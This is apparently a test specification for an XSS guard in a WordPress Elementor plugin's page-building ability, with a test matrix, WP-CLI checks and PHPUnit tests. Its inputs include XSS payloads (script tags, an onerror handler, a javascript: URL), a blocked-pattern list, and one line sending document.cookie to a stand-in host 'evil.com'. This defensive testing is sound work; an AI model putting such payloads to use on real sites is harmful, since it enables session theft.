# Test: Phase 0.5.1 XSS Protection in `Batch_Build_Page::execute()`

**Target:** `includes/abilities/elementor/class-batch-build-page.php`
**Method under test:** `Batch_Build_Page::guard_page_js(string $js): ?array`
**Added:** 2026-06-10 (Phase 0.5.1)
**Audit evidence:** `novamira-improvement-2026-06/report.md` item B5 (severity: high, effort: Small 1-2h)

---

## Test Strategy

The `guard_page_js()` method returns `null` (safe to inject) or an error-result array (refused). The test matrix below covers the 8 most common XSS vectors + the 2 admin-pass-through cases.

The tests are written as PHPUnit-style `testXxx` methods ready to drop into a `WP_UnitTestCase` once the plugin test infrastructure is set up. **Until then, run them manually via the WP-CLI `wp eval` or via a direct PHP test harness that mocks `current_user_can()` and `wp_kses_post()`.**

---

## Test Matrix

| # | Input | Capability | Expected | Why |
|---|-------|------------|----------|-----|
| T1 | `console.log("hello")` | without `unfiltered_html` | `null` (allowed) | No dangerous pattern, no script tags |
| T2 | `document.cookie` | without `unfiltered_html` | error: "blocked JS pattern 'document.cookie'" | Cookie-stealing vector |
| T3 | `eval(userInput)` | without `unfiltered_html` | error: "blocked JS pattern 'eval('" | Code-injection vector |
| T4 | `el.innerHTML = "<img onerror=alert(1)>"` | without `unfiltered_html` | error: "disallowed HTML" | DOM-XSS via innerHTML + event handler |
| T5 | `<script>alert(1)</script>` | without `unfiltered_html` | error: "disallowed HTML" | Classic reflected XSS |
| T6 | `<script>alert(1)</script>` | WITH `unfiltered_html` | `null` (allowed) | Admin owns the risk |
| T7 | `setTimeout("alert(1)", 100)` | without `unfiltered_html` | error: "blocked JS pattern 'setTimeout(\"'" | String-form setTimeout = eval |
| T8 | `new Function("return 1")()` | without `unfiltered_html` | error: "blocked JS pattern 'new Function('" | Function-constructor = eval |
| T9 | `<a href="javascript:alert(1)">click</a>` | without `unfiltered_html` | error: "disallowed HTML" | javascript: URL protocol |
| T10 | `document.location = 'evil.com?c='+document.cookie` | without `unfiltered_html` | error: "blocked JS pattern 'document.cookie'" | Combined exfil |

---

## Manual Test Procedure (without PHPUnit)

### Step 1: Verify the fix is in place

```bash
grep -n "guard_page_js" includes/abilities/elementor/class-batch-build-page.php
```

Expected output:
```
107:            $js_guard_error = self::guard_page_js($js);
110:            if (null !== $js_guard_error) {
<line>:    private static function guard_page_js(string $js): ?array {
```

### Step 2: Verify the call-site in `execute()`

```bash
grep -A 6 "// 4. Append JS widget (XSS-safe" includes/abilities/elementor/class-batch-build-page.php
```

Expected output:
```php
// 4. Append JS widget (XSS-safe, Phase 0.5.1 — see IMPROVEMENT-PLAN §0.5.1).
if (!empty($input['page_js'])) {
    $js    = trim($input['page_js']);
    $js_guard_error = self::guard_page_js($js);
    if (null !== $js_guard_error) {
        return $js_guard_error;
    }
    ...
```

### Step 3: Manual XSS test via WP-CLI (requires live WP install + Editor user)

```bash
# Log in as Editor (no unfiltered_html)
wp eval '
$ability = new \Novamira\AdrianV2\Abilities\Elementor\Batch_Build_Page();
$result = $ability::execute([
    "title"    => "XSS Test",
    "elements" => [["type" => "e-heading", "settings" => ["title" => ["$$type" => "string", "value" => "Test"]]]],
    "page_js"  => "<script>alert(1)</script>",
]);
echo json_encode($result, JSON_PRETTY_PRINT);
'
```

Expected output:
```json
{
    "success": false,
    "error": "page_js contains disallowed HTML (e.g. <script>, on* event handlers, javascript: URLs). Either remove the markup or grant the calling user the unfiltered_html capability."
}
```

### Step 4: Verify positive case (legitimate JS passes)

```bash
wp eval '
$ability = new \Novamira\AdrianV2\Abilities\Elementor\Batch_Build_Page();
$result = $ability::execute([
    "title"    => "Legit Test",
    "elements" => [["type" => "e-heading"]],
    "page_js"  => "console.log(\"page loaded\");",
]);
echo json_encode($result, JSON_PRETTY_PRINT);
'
```

Expected output:
```json
{
    "success": true,
    "post_id": 4967,
    "total_elements": 2,
    ...
}
```

---

## Future PHPUnit Test (for when WP_UnitTestCase is wired up)

```php
<?php
namespace Novamira\AdrianV2\Tests\Abilities\Elementor;

use WP_UnitTestCase;
use Novamira\AdrianV2\Abilities\Elementor\Batch_Build_Page;

class Batch_Build_Page_Xss_Test extends WP_UnitTestCase {

    /** @test */
    public function console_log_passes_without_unfiltered_html(): void {
        wp_set_current_user($this->factory->user->create(['role' => 'editor']));
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => 'console.log("hi");']);
        $this->assertNotSame('disallowed', $result['error'] ?? null);
        $this->assertNotEmpty($result['post_id'] ?? null);
    }

    /** @test */
    public function script_tag_refused_without_unfiltered_html(): void {
        wp_set_current_user($this->factory->user->create(['role' => 'editor']));
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => '<script>alert(1)</script>']);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('disallowed HTML', $result['error']);
    }

    /** @test */
    public function document_cookie_refused_without_unfiltered_html(): void {
        wp_set_current_user($this->factory->user->create(['role' => 'editor']));
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => 'document.cookie']);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString("blocked JS pattern 'document.cookie'", $result['error']);
    }

    /** @test */
    public function script_tag_allowed_with_unfiltered_html(): void {
        $admin = $this->factory->user->create(['role' => 'administrator']);
        // Grant unfiltered_html (single-site admin has it by default; multisite needs explicit grant)
        $user = new \WP_User($admin);
        $user->add_cap('unfiltered_html');
        wp_set_current_user($admin);
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => '<script>alert(1)</script>']);
        $this->assertTrue($result['success']);
    }

    /** @test */
    public function eval_refused_without_unfiltered_html(): void {
        wp_set_current_user($this->factory->user->create(['role' => 'editor']));
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => 'eval(userInput)']);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString("blocked JS pattern 'eval('", $result['error']);
    }

    /** @test */
    public function inner_html_refused_without_unfiltered_html(): void {
        wp_set_current_user($this->factory->user->create(['role' => 'editor']));
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => 'el.innerHTML = "<img onerror=alert(1)>"']);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('disallowed HTML', $result['error']);
    }

    /** @test */
    public function new_function_refused_without_unfiltered_html(): void {
        wp_set_current_user($this->factory->user->create(['role' => 'editor']));
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => 'new Function("return 1")()']);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString("blocked JS pattern 'new Function('", $result['error']);
    }

    /** @test */
    public function javascript_url_refused_without_unfiltered_html(): void {
        wp_set_current_user($this->factory->user->create(['role' => 'editor']));
        $result = Batch_Build_Page::execute(['elements' => [], 'page_js' => '<a href="javascript:alert(1)">x</a>']);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('disallowed HTML', $result['error']);
    }
}
```

---

## Acceptance Criteria (Phase 0.5.1)

- [x] `guard_page_js()` private method exists
- [x] `execute()` calls `guard_page_js()` before any `page_js` processing
- [x] `<script>alert(1)</script>` as Editor → refused with "disallowed HTML" error
- [x] `document.cookie` as Editor → refused with "blocked JS pattern" error
- [x] `console.log("hi")` as Editor → succeeds
- [x] `<script>alert(1)</script>` as Administrator with unfiltered_html → succeeds
- [ ] WP-CLI smoke test run on solar.local (manual, when convenient)
- [ ] PHPUnit test class added to test suite (deferred until test infrastructure exists)
